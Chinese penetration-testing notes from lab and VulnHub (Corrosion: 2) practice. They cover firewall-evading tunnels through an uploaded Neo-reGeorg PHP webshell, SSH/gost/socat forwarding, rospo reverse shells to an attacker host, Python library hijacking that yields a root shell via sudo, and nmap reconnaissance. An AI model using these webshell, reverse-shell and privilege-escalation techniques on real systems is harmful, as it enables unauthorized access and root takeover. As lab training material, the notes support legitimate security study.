# 渗透测试



## 隧道

### 端口过滤

**入站**仅允许TCP 80端口（接收外部请求），**出站**仅允许 TCP 80 端口（已建立的连接），其他端口（如22/SSH、443/HTTPS等）和 ICMP 协议均被阻断。



靶机限制：仅允许通过 80 端口入站，仅允许 80 端口出站，不允许其他任何端口出站。

![image-20250304094331572](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304094331572.png)



Neo-reGeorg 工具生成 php、jsp 文件，上传到网站后可以与目标网站建立 socks5 连接。

生成 tunnel 文件

```
python neoreg.py generate -k 123 -o socks

...
    [+] Mkdir a directory: socks
    [+] Create neoreg server files:
       => socks/tunnel.cs
       => socks/tunnel.go
       => socks/tunnel.ashx
       => socks/tunnel.aspx
       => socks/tunnel.php
       => socks/tunnel.jsp
       => socks/tunnel.jspx
```



将 tunnel.php 文件上传到网站。

![image-20250304100018267](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304100018267.png)



启动 socks5 连接

```
python neoreg.py -k 123 -u http://10.10.10.100/site/tunnel.php -l 0.0.0.0 -p 8080

...
+------------------------------------------------------------------------+
  Log Level set to [ERROR]
  Starting SOCKS5 server [0.0.0.0:8080]
  Tunnel at:
    http://10.10.10.100/site/tunnel.php
+------------------------------------------------------------------------+
```



proxychains4 配置文件设置 socks5 服务器

![image-20250304100143821](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304100143821.png)



使用 proxychain4 连接到目标服务器

```
proxychains4 ssh jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

262 pacotes podem ser atualizados.
175 atualizações são atualizações de segurança.


Last login: Mon Mar  3 21:38:44 2025 from 10.10.10.100
jangow01@jangow01:~$ 
```



**Neo-reGeorg generate 工具帮助**

```
用法: neoreg.py generate [-h] -k 密钥 [-o 目录] [-f 文件] [-c 状态码] [-T 模板/文件] [--read-buff 字节数] [--max-read-size 千字节]

功能: 生成Neoreg隧道WebShell

选项说明:
  -h, --help            显示帮助信息
  -k KEY, --key KEY     必填参数，指定WebShell连接密钥
  -o DIR, --outdir DIR  指定WebShell文件输出目录
  -f FILE, --file FILE  伪装页面文件路径（用于隐藏WebShell）
  -c CODE, --httpcode CODE
                        设置HTTP响应状态码（配合-r参数时建议值<400，默认200）
  -T STR/FILE, --request-template STR/FILE
                        自定义HTTP请求模板（示例：'img=data:image/png;base64,NEOREGBODY&save=ok'）
  --read-buff Bytes     远程数据读取缓冲区大小（默认：513字节）
  --max-read-size KB    单次请求最大读取量（默认：512KB）
```



**工具帮助**

```
用法: neoreg.py [-h] -u URI [-r URL] [-R] [-t IP:PORT] -k KEY [-l IP] [-p PORT] [-s] [-H LINE] [-c LINE] [-x LINE] [-T STR/FILE] [--php] [--php-skip-cookie]
               [--go] [--php-connect-timeout S] [--local-dns] [--read-buff KB] [--read-interval MS] [--write-interval MS] [--max-threads N] [--max-retry N]
               [--cut-left N] [--cut-right N] [--extract EXPR] [-v]

选项:
  -h, --help            显示帮助信息
  -u URI, --url URI     包含隧道脚本的URL地址
  -r URL, --redirect-url URL
                        内网转发至指定服务器 (仅支持Java/.NET)
  -R, --force-redirect  强制转发 (仅JSP -r)
  -t IP:PORT, --target IP:PORT
                        网络转发目标地址，设置后启用端口转发
  -k KEY, --key KEY     指定连接密钥
  -l IP, --listen-on IP 监听地址 (默认: 127.0.0.1)
  -p PORT, --listen-port PORT
                        监听端口 (默认: 1080)
  -s, --skip            跳过可用性检测
  -H LINE, --header LINE
                        添加自定义请求头
  -c LINE, --cookie LINE
                        自定义初始化Cookie
  -x LINE, --proxy LINE
                        使用代理服务器，格式 Proto://host[:port]
  -T STR/FILE, --request-template STR/FILE
                        HTTP请求模板 (示例: 'img=data:image/png;base64,NEOREGBODY&save=ok')
  --php                 使用PHP连接模式
  --php-skip-cookie     跳过PHP的Cookie可用性检查
  --go                  使用Go连接模式
  --php-connect-timeout S
                        PHP连接超时时间 (默认: 0.5秒)
  --local-dns           使用本地DNS解析
  --read-buff KB        本地读取缓冲区大小，单次POST最大数据量 (默认: 7KB, 最大: 50KB)
  --read-interval MS    数据读取间隔 (毫秒，默认: 300)
  --write-interval MS   数据写入间隔 (毫秒，默认: 200)
  --max-threads N       最大代理线程数 (默认: 400)
  --max-retry N         最大重试次数 (默认: 10)
  --cut-left N          截取响应体左侧N字节
  --cut-right N         截取响应体右侧N字节
  --extract EXPR        手动提取响应体内容 (示例: <html><p>NEOREGBODY</p></html>)
  -v                    增加输出详细程度 (使用 -vv 或更多参数以获取更详细输出)
```



#### 端口转发示例

将本地 2222 端口的数据转发到远程 22 端口。

```
neoreg -k 123 -u http://10.10.10.100/site/tunnel.php --php -l 0.0.0.0 -p 2222 -t 127.0.0.1:22 
```





### ssh 隧道

#### 本地端口转发

将本地主机的某个端口通过 SSH 隧道转发到远程服务器的指定端口。

```
ssh -L [本地IP:]本地端口:目标主机:目标端口 用户名@SSH服务器
```

```
ssh -L 3306:localhost:3306 user@example.com
```

- 本地 `3306` 端口的流量会被转发到 `example.com` 服务器的 `localhost:3306`（如 MySQL）。
- 若需允许其他设备访问本地端口，可绑定到 `0.0.0.0`。



**Unix 域套接字转发**

将本地 Unix Socket 转发到远程 Unix Socket（SSH 7.3+ 支持）。

```
ssh -R [远程套接字路径]:[本地套接字路径] 用户名@SSH服务器
```

```
ssh -L /tmp/local.sock:/var/run/remote.sock user@example.com
```



#### 远程端口转发

将远程服务器的某个端口通过 SSH 隧道转发回本地主机的指定端口（反向隧道）。

```
ssh -R [远程IP:]远程端口:本地主机:本地端口 用户名@SSH服务器
```

```
ssh -R 8080:localhost:80 user@example.com
```

- 远程服务器 `example.com` 的 `8080` 端口流量会转发到本地的 `80` 端口（如本地 Web 服务）。
- 默认绑定到远程服务器的 `127.0.0.1`，需在 SSH 服务器配置中启用 `GatewayPorts yes` 以允许外部访问。



**Unix 域套接字转发**

将远程 Unix 域套接字（Remote Unix Socket）转发到本地。

```
ssh -R [本地套接字路径]:[远程套接字路径] 用户名@SSH服务器
```

```
ssh -R /var/run/remote_service.sock:/tmp/local.sock user@example.com
```



#### 动态端口转发

创建 SOCKS 代理服务器，动态转发所有流量到远程网络。

```
ssh -D [本地IP:]本地端口 用户名@SSH服务器
```

```
ssh -D 1080 user@example.com
```

- 在本地 `1080` 端口启动 SOCKS5 代理，浏览器或应用配置代理后，流量经 `example.com` 转发。



#### 多跳隧道

多跳隧道（Jump Host 或 ProxyJump）是一种通过多个中间 SSH 服务器（跳板机）连接到目标主机的技术，类似“链式连接”。

```
ssh -J user1@jump_host user2@target_host
```

- 先通过 `user1@jump_host` 连接到第一个跳板机。
- 再从 `jump_host` 连接到最终目标主机 `target_host`（身份为 `user2`）。



SSH 协议本身无跳数限制，可通过逗号分隔多个跳板机：

```
ssh -J user1@jump1,user2@jump2,user3@jump3 user4@target_host
```

- 连接路径：本地 → `jump1` → `jump2` → `jump3` → `target_host`。



使用多跳隧道同时可以使用  `-L` 或 `-R` 参数进行端口转发。

```
ssh -J user1@jump_host -L 本地端口:目标主机:目标端口 user2@target_host
```

- 本地端口流量 → 跳板机 `jump_host` → 目标主机 `target_host` 的端口。



```
ssh -J user1@jump_host -R 远程端口:本地服务主机:本地端口 user2@target_host
```

- 目标主机 `target_host` 的远程端口 → 跳板机 `jump_host` → 本地服务主机的端口。



#### ssh + socks5

靶机的 SSH 服务运行在 22 端口，但防火墙规则阻止了所有外部对该端口的直接入站连接（即外部无法直接访问靶机的 22 端口）。

本地机器上启动了一个 SOCKS5 代理服务，监听在 127.0.0.1（即本机）的 8080 端口，该代理能够绕过防火墙限制，通过其他已建立的通信渠道将流量间接传输到靶机内部网络中。

通过此 SOCKS5 代理，用户可将 SSH 客户端流量封装并转发到靶机的 22 端口。



**直接访问（失败）**

```

```



**proxychains4**

使用 proxychains4 代理流量，**普通 ssh 连接**。

```
proxychains4 ssh jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ 
```



将**本地 2222 端口**转发到**远程 22 端口**

```
proxychains4 ssh -L 2222:127.0.0.1:22 -Nf jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
```



直接使用本地 2222 端口即可连接到远程服务器

```
ssh jangow01@127.0.0.1 -p 2222

jangow01@127.0.0.1's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ 
```



将**远程 4444 端口**转发到**本地 4444 端口**

```
proxychains4 ssh -R 4444:127.0.0.1:4444 jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
```



远程主机已经监听 4444 端口

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name	
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN       -               
```



本地使用 nc 监听 4444 端口，远程主机尝试连接 127.0.0.1 4444 端口

```
jangow01@jangow01:~$ nc 127.0.0.1 4444
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:4444  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:4444  ...  OK
...
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:4444  ...  OK
...
```

**proxychains4 的工作原理**是通过 `LD_PRELOAD` 动态库劫持应用程序的所有 TCP 连接，强制将这些连接通过预先配置的代理服务器转发。默认情况下，它会劫持包括本地回环地址（`127.0.0.1`）在内的所有连接。

假设远程 SSH 服务器将 `127.0.0.1:4444` 的流量转发到本地客户端，而本地客户端尝试将数据发送到本地的 `127.0.0.1:4444` 端口。由于 proxychains4 劫持了此连接，数据会被重新发送到远程 SSH 服务器，导致远程服务器又将数据传回本地，形成 **无限循环**。

**解决方案**是修改 proxychains4 的配置文件，使其忽略对本地回环地址（`127.0.0.1`）的劫持。在配置文件中添加 `localnet` 字段，例如：

```
localnet 127.0.0.0/8
```



重新开启远程端口转发

```
proxychains4 ssh -R 4444:127.0.0.1:4444 jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ netstat -tunpl 
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name	
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN       -               

jangow01@jangow01:~$ nc 127.0.0.1 4444 
hello 
```



本地 nc 成功接收到数据

```
root@localhost:~# nc -l -p 4444
hello
```



#### ProxyCommand

ProxyCommand 告诉 SSH 客户端不要直接连接目标服务器，而是通过指定的命令（此处是 nc）建立隧道。SSH 的流量会通过你指定的代理命令（这里是 `nc`）转发。

```
ssh -o ProxyCommand="nc -x 127.0.0.1:8080 %h %p" jangow01@10.10.10.100
```

 **nc -x 127.0.0.1:8080 %h %p** 命令

- **`nc`**：`netcat` 工具，用于网络通信。

- **`-x 127.0.0.1:8080`**：指定使用本地的 `8080` 端口作为 SOCKS5 代理。

- `%h` 和 `%p`

    ：SSH 客户端自动替换的变量：

    - `%h` → 目标主机地址（如 `10.10.10.100`）。
    - `%p` → 目标端口（如 SSH 默认的 `22`）。



不仅只有 nc 工具，还可以使用其他的工具（如：connect）

```
ssh -o ProxyCommand="connect -S 127.0.0.1:8080 %h %p" jangow01@10.10.10.100
```

注：在 ubuntu 中 connect 工具需要安装 connect-proxy 工具（**apt install connect-proxy**）



ProxyCommand 是 ssh 默认支持的参数，与 nc 等其他工具搭配非常简单，即使是**远程端口转发也无需额外配置**。



### gost

ssh 使用端口转发需要在 sshd_config 将 AllowTcpForwarding 选项设置为 yes（默认开启），如果用户主动关闭了 ssh 转发则可以使用 gost 工具替代。

gost 的全称是 GO Simple Tunnel，它是一个使用 GO 语言实现的安全隧道，**支持**简单**命令行参数**快速使用和复杂的**配置文件**。其功能强大，支持多种协议。



在靶机上 gost 使用 relay 监听 3333 端口，攻击机通过 Neo-reGeorg（PHP）将本地 3333 端口转发到远程 3333 端口，攻击机的 gost 只需连接本地的 3333 端口即可与靶机 gost 进行交互。



在靶机上执行 gost 程序，使用 relay 协议监听 3333 端口

![image-20250304201410339](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304201410339.png)

注：设置多个参数，需使用 `&` 符号分隔参数，并通过 **URL 编码格式**（如空格用 `%20`，一般参数无需手动转义），重点注意 **引号包裹命令** 和 **参数分隔符 `&`** 的正确使用。



在攻击机上使用 Neo-reGeorg 工具，将本地 3333 端口转发到靶机 3333 端口。

```
neoreg -k 123 -u http://10.10.10.100/site/tunnel.php --read-interval 1 --write-interval 1 --php -l 0.0.0.0 -p 3333 -t 127.0.0.1:3333
```

注：在以下所有命令中 127.0.0.1:3333 相当于 10.10.10.100:3333



#### 本地端口转发

将本地端口转发到靶机上的端口

```
gost -L tcp://:2222/127.0.0.1:22 -F relay://127.0.0.1:3333?nodelay=true
```

将本地的TCP端口 2222 映射到 10.10.10.100 的 2222 端口，所有到本地 2222 端口的数据会被转发到 10.10.10.100:2222。



#### 远程端口转发

将远程靶机端口转发到本地端口

```
gost -L rtcp://:4444/127.0.0.1:4444 -F relay://127.0.0.1:3333?nodelay=true
```

根据rtcp服务指定的地址，通过转发链在主机 10.10.10.**100** 上监听 4444 TCP端口。当收到请求后再通过转发链将数据转发给rtcp服务，rtcp服务再将请求转发到 10.10.10.**10**:4444 端口（10.10.10.10 为本机 IP，即命令中的 127.0.0.1:4444）。

注：如果不使用转发链（-F），则 tcp 和 rtcp 无区别。



本地端口转发和远程端口转发可以在一个 gost 进程上同时运行，以下命令等价：

```
gost -L tcp://:2222/127.0.0.1:22 -F relay://127.0.0.1:3333?nodelay=true -L rtcp://:4444/127.0.0.1:4444 -F relay://127.0.0.1:3333?nodelay=true -L rtcp://:5555/127.0.0.1:5555 -F relay://127.0.0.1:3333?nodelay=true
```

```
gost -L tcp://:2222/127.0.0.1:22 -L rtcp://:4444/127.0.0.1:4444 -L rtcp://:5555/127.0.0.1:5555 -F relay://127.0.0.1:3333?nodelay=true
```

- **`-L` 定义服务入口**：每个 `-L` 参数表示一个独立的服务（如监听端口、协议类型）。
- **`-F` 定义转发链出口**：`-F` 参数的作用范围是 **其左侧最近的 `-L`**（即按命令行中参数顺序绑定）。
    **若没有显式指定 `-F`，则默认直连目标地址，不经过转发链**。





#### socks5 

本地开启 socks5 入站，将数据通过 relay 转发到靶机。

```
gost -L socks5://:1080 -F relay://127.0.0.1:3333?nodelay=true
```



### socat

#### unix 转发

将 TCP 端口的数据转发到套接字

```
socat TCP-LISTEN:3307,reuseaddr,fork UNIX-CONNECT:/var/run/mysqld/mysqld.sock
```



### Rospo

Rospo 是一款专为创建安全可靠 SSH 隧道的工具，单个二进制文件集成客户端和服务端功能。旨在让 SSH 隧道技术重新焕发趣味与易用性。



#### SSHD

启动 ssh 服务器

```
rospo sshd -A pass123 -P :2222
```



客户端连接 ssh 服务器

```
ssh root@127.0.0.1 -p 2222
```

```
rospo shell root@127.0.0.1:2222 -p pass123
```



命令帮助

```
Starts the sshd server

Usage:
  rospo sshd [flags]

Flags:
  -T, --disable-auth                      若设置则客户端无需认证即可连接
  -D, --disable-shell                     若设置则禁用 shell/执行功能
  -h, --help                              显示帮助信息
  -K, --sshd-authorized-keys string       SSH服务器授权密钥路径。
                                          支持类似 https://github.com/<username>.的 HTTP URL格式 (默认 												  "./authorized_keys")
  -A, --sshd-authorized-password string   SSH服务器授权密码。留空则禁用密码验证
  -I, --sshd-key string                   SSH服务器密钥路径 (默认 "./server_key")
  -P, --sshd-listen-address string        SSH服务器TCP监听地址 (默认 ":2222")

Global Flags:
  -q, --quiet   若设置则禁用所有日志输出
```

```
Starts a remote shell

Usage：
  rospo shell [user@]主机[:端口] [命令字符串] [参数]
  
Flags：
  -b, --disable-banner         禁用服务器横幅显示
  -h, --help                   显示帮助信息
  -i, --insecure               禁用已知主机密钥验证（跳过known_hosts检查）
  -j, --jump-host string       指定跳板机配置（可选）
  -k, --known-hosts string     指定known_hosts文件绝对路径（默认"/root/.ssh/known_hosts"）
  -p, --password string        设置SSH客户端密码
  -s, --user-identity string   指定SSH身份密钥（私钥）绝对路径（默认"/root/.ssh/id_rsa"）
  
Global Flags：
  -q, --quiet   启用静默模式（关闭所有日志输出）
```



#### 反向 shell

rospo反向Shell的核心机制是：靶机首先主动连接至攻击机的SSH服务器，通过建立SSH隧道将攻击机上的指定端口远程转发到靶机本地。特别之处在于，`rospo revshell`命令会**自动完成两个关键操作**：既建立远程端口转发通道，又直接在靶机端启动本地SSH服务（无需额外部署其他SSH服务程序）。此时攻击机连接自身被转发的本地端口，即可通过加密隧道直接访问靶机自启动的SSH服务。



攻击机监听 2222 端口，开启 ssh 服务，密码为 111

```
rospo revshell root@10.12.0.100:2222 -i -A 111
```



靶机连接到攻击机 ssh 服务，开启远程端口转发（监听远程的 3333 端口），开启本地 ssh 服务，设置端口为 4444 （远程 3333 端口转发到本地 4444 端口），本地 ssh 服务密码为 222

```
rospo revshell root@10.12.0.100:2222 -r 127.0.0.1:3333 -i -p 111 -A 222 -P :4444
```



攻击机使用 ssh 连接到本地的 3333 端口，就可以连接到靶机的 ssh 服务。

```
root@xiaoshae:/opt# ssh root@127.0.0.1 -p 3333

 .---------------.
 | 🐸 rospo sshd |
 .---------------.

root@127.0.0.1's password: 
[root@linux1 ~]# 
```



命令示例

```
启动本地SSH守护进程并将其端口转发至远程主机

前置检查：
  1. 远程服务器公钥需存在于known_hosts文件中（使用insecure参数可禁用此验证）
     可通过'grabpubkey'命令显式获取公钥
  2. 您的身份凭证需在远程服务器授权（可通过keygen命令生成新凭证）
  3. 本地authorized_keys文件需已创建且包含至少一个密钥以支持反向连接
     此处可使用不同选项，请参考"-K"参数说明

用法：
  rospo revshell [user@]主机[:端口] [参数]

示例：

  # 在user@server的默认远程地址:2222启动反向shell
  $ rospo revshell user@server	

  # 在远程地址:6666启动反向shell，并拉取GitHub公钥
  $ rospo revshell -r :6666  -K http://github.com/[用户].keys user@server

参数：
  -T, --disable-auth                      禁用身份验证（允许客户端无认证连接）
  -b, --disable-banner                    禁用服务器横幅显示
  -h, --help                              显示帮助信息
  -i, --insecure                          禁用已知主机密钥验证（跳过known_hosts检查）
  -j, --jump-host string                  指定跳板机配置（可选）
  -k, --known-hosts string                known_hosts文件绝对路径（默认"/root/.ssh/known_hosts"）
  -p, --password string                   SSH客户端密码
  -r, --remote string                     远程shell监听端点（默认"127.0.0.1:2222"）
  -K, --sshd-authorized-keys string       SSH服务端授权密钥路径。
                                          支持HTTP URL格式（如https://github.com/<用户名>.keys）（默认"./authorized_keys"）
  -A, --sshd-authorized-password string   SSH服务端授权密码（空值则禁用该验证）
  -I, --sshd-key string                   SSH服务端密钥路径（默认"./server_key"）
  -P, --sshd-listen-address string        SSH服务端监听地址（默认":2222"）
  -s, --user-identity string              SSH身份（私钥）绝对路径（默认"/root/.ssh/id_rsa"）

全局参数：
  -q, --quiet   启用静默模式（关闭所有日志输出）
```



#### 端口转发

将本地8080端口转发至远程8080端口

```
rospo tun forward -l :8080 -r :8080 root@10.12.0.100:2222 -i -p 111
```



从本地5000端口创建反向隧道至远程8888端口（通过跳板机服务器进行代理）

```
rospo tun reverse -l :5000 -r :8888  -j root@10.12.0.100:22 root@10.12.0.100:2222 -i -p 111
```



命令示例

```
创建可靠SSH隧道的工具集

用法：
  rospo [参数]
  rospo [子命令]

可用命令：
  completion   生成指定shell的自动补全脚本
  dns-proxy    启动DNS-over-TCP代理
  get          从远程主机获取文件
  grabpubkey   抓取主机公钥并存入known_hosts文件
  help         查看任意命令的帮助信息
  keygen       生成SSH密钥对
  put          将本地文件上传至远程主机
  revshell     启动反向shell连接
  run          使用配置文件运行rospo
  shell        启动远程shell会话
  socks-proxy  启动SOCKS代理服务
  sshd         启动SSH守护进程
  template     生成配置模板文件
  tun          创建可靠SSH隧道

全局参数：
  -h, --help     显示帮助信息
  -q, --quiet    启用静默模式（关闭所有日志输出）
  -v, --version  显示版本信息

使用 "rospo [子命令] --help" 查看具体命令的详细说明
```



#### socks

监听本地 8080 端口，允许 socks 入站，入站流量转发到远程主机。

```
rospo socks-proxy -i -l 0.0.0.0:8080 -p 111 root@10.12.0.100:2222
```



命令示例

```
启动SOCKS代理服务

支持协议版本：
  ✔ SOCKS4/SOCKS5 双协议支持

使用说明：
  需在浏览器中配置SOCKS代理。Windows系统用户需在代理配置界面的地址栏填写 "socks=localhost"

用法：
  rospo socks-proxy [用户@]主机[:端口] [参数]

示例：
  # 在127.0.0.1:1080启动SOCKS代理
  # 通过SSH服务器（sshhost:sshport）建立隧道
  $ rospo proxy sshhost:sshport

参数：
  -b, --disable-banner         禁用服务器横幅显示
  -h, --help                   显示帮助信息
  -i, --insecure               禁用已知主机密钥验证
  -j, --jump-host string       指定跳板机配置（可选）
  -k, --known-hosts string     known_hosts文件绝对路径（默认"/root/.ssh/known_hosts"）
  -l, --listen-address string  代理监听地址（默认"127.0.0.1:1080"）
  -p, --password string        SSH客户端密码
  -s, --user-identity string   SSH身份（私钥）绝对路径（默认"/root/.ssh/id_rs
```





#### 示例

```
创建可靠SSH隧道的工具集

用法：
  rospo [参数]
  rospo [子命令]

可用命令：
  completion   生成指定shell的自动补全脚本
  dns-proxy    启动DNS-over-TCP代理
  get          从远程主机获取文件
  grabpubkey   抓取主机公钥并存入known_hosts文件
  help         查看任意命令的帮助信息
  keygen       生成SSH密钥对
  put          将本地文件上传至远程主机
  revshell     启动反向shell连接
  run          使用配置文件运行rospo
  shell        启动远程shell会话
  socks-proxy  启动SOCKS代理服务
  sshd         启动SSH守护进程
  template     生成配置模板文件
  tun          创建可靠SSH隧道

全局参数：
  -h, --help     显示帮助信息
  -q, --quiet    启用静默模式（关闭所有日志输出）
  -v, --version  显示版本信息

使用 "rospo [子命令] --help" 查看具体命令的详细说明
```



## 权限提升



### msf 一键提权





### sudo



### Python 库劫持

#### PYTHONPATH

Python 在导入模块时，会按 `sys.path` 列表中的顺序搜索路径。攻击者可将恶意库放置在高优先级的路径中（如当前工作目录），覆盖合法库。

通过设置 `PYTHONPATH` 环境变量，添加攻击者控制的目录到模块搜索路径的最前端。



查看用户的 sudo 权限，允许设置环境变量，允许通过 sudo 以 root 用户允许某个 Python 脚本。

```
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) SETENV: PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



Python 脚本的内容如下，脚本中使用 base64，可以通过 PYTHONPATH 环境变量进行劫持。

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```



创建 /tmp/lib 目录，创建 base64.py 文件

```
-rwxrwxr-x 1 randy randy   33 Mar  3 03:39 base64.py
```



base64.py 文件的内容为启动一个 bash

```
import os
os.system('/bin/bash')
```



劫持成功

```
randy@corrosion:/tmp/lib$ sudo PYTHONPATH=/tmp/lib/ /usr/bin/python3.8 /home/randy/randombase64.py 
root@corrosion:/tmp/lib# id
uid=0(root) gid=0(root) groups=0(root)
```





#### 库文件修改

Python 脚本使用某个库文件（如：base64.py），允许以 root 用户脚本，用户可以**修改库文件内容**。



sudo 允许以 root 用户运行脚本

```
sudo -l

Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



Python 脚本如下：

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```



查看 Python 搜索库的路径

```
>>> import sys
>>> print("\n".join(sys.path))

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```



在系统上查找所有 base64.py 文件

```
locate base64.py

/home/randy/randombase64.py
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py
/usr/lib/python3.8/base64.py
```



查看文件的权限（具有写入权限）

```
-rwxrwxrwx 1 root root 20420 Mar  2 16:52 /usr/lib/python3.8/base64.py
```



修改 base64.py 文件

![image-20250303085207798](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250303085207798.png)



sudo 执行脚本，获得 root 权限。

```
sudo /usr/bin/python3.8 /home/randy/randombase64.py 

[sudo] password for randy: 
root@corrosion:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```



### 动态链接库劫持





## vulnhub

### Corrosion: 2

Nmap 扫描 IP 地址。

```
msf6 > db_nmap -sP -PR -T 5 -n 10.10.10.0/24
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 07:30 UTC
[*] Nmap: Nmap scan report for 10.10.10.1
[*] Nmap: Host is up (0.00047s latency).
[*] Nmap: MAC Address: 00:50:56:C0:00:0A (VMware)
[*] Nmap: Nmap scan report for 10.10.10.103
[*] Nmap: Host is up (0.00016s latency).
[*] Nmap: MAC Address: 00:0C:29:25:CD:30 (VMware)
[*] Nmap: Nmap scan report for 10.10.10.200
[*] Nmap: Host is up (0.000082s latency).
[*] Nmap: MAC Address: 00:50:56:FA:67:12 (VMware)
[*] Nmap: Nmap scan report for 10.10.10.10
[*] Nmap: Host is up.
[*] Nmap: Nmap done: 256 IP addresses (4 hosts up) scanned in 1.53 seconds
```

```
address       mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----  -------  ---------  -----  -------  ----  --------
10.10.10.1    00:50:56:C0:00:0A
10.10.10.10
10.10.10.103  00:0C:29:25:CD:30
10.10.10.200  00:50:56:FA:67:12
```

注：此处通过排除法确定 10.10.10.103 是靶机（因为其他机器全是我的）。



Nmap 扫描 IP 的 TCP 端口信息和操作系统信息。

```
msf6 > db_nmap -sS -sV -p- -r -n -T 5 -O 10.10.10.103
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 07:35 UTC
[*] Nmap: Nmap scan report for 10.10.10.103
[*] Nmap: Host is up (0.00040s latency).
[*] Nmap: Not shown: 65532 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
[*] Nmap: 8080/tcp open  http    Apache Tomcat 9.0.53
[*] Nmap: MAC Address: 00:0C:29:25:CD:30 (VMware)
[*] Nmap: Device type: general purpose|router
[*] Nmap: Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
[*] Nmap: OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
```

```
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.103  22    tcp    ssh   open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
10.10.10.103  80    tcp    http  open   Apache httpd 2.4.41 (Ubuntu)
10.10.10.103  8080  tcp    http  open   Apache Tomcat 9.0.53
```

